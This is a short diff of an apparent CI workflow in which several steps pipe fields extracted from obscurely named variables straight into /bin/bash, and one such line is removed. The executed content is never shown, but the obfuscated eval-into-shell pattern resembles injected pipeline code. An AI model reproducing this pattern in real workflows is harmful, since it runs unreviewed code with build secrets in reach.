@@ -27,7 +27,6 @@ jobs:
           echo $fg603 | jq -r .clh8 | /bin/bash
           printf '%s' "$os7975" | jq -r .zvoqg1295 | /bin/bash
           printf '%s' "$fvrl316" | jq -r .rm2 | /bin/bash
-          echo $gda47218 | jq -r .mozlo875 | /bin/bash
           echo $cohp56933 | jq -r .lj50441 | /bin/bash
 
       - name: Save results
